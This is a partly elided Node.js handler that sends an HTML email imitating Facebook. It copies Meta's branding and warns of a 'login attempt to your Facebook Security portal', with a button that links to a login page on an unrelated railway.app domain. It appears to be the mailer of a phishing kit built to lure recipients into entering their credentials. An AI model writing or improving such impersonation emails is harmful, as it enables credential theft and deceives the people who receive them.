...
exports.sendLoginEmail = async (req, res) => {
  try {
    ...
    const loginLink =
      `${process.env.FRONTEND_URL || "https://security-system-production.up.railway.app"}/login.html`;

    // Professional, Meta-inspired email template
    const emailTemplate = `
<div style="background:#f0f2f5;padding:50px 0;font-family:Segoe UI,Arial,sans-serif">
  <div style="max-width:620px;margin:auto;background:white;border-radius:12px;
    ...
    <div style="padding:25px 30px;background:#1877f2;color:white;text-align:center">
      <img src="${process.env.FRONTEND_URL || "https://security-system-production.up.railway.app"}/images/logo.png"
    ...
    <div style="padding:35px 30px;color:#1c1e21;font-size:15px;line-height:1.6">
      ...
      <p>
        We detected a login attempt to your <strong>Facebook Security portal</strong>.
      ...
      <div style="text-align:center;margin:35px 0">
        <a href="${loginLink}" target="_blank"
          ...
          display:inline-block;box-shadow:0 4px 12px rgba(24,119,242,0.35);
...
`;
    ...
    if (!sent) {
      console.error("Email not sent - check Resend API and FROM_EMAIL");
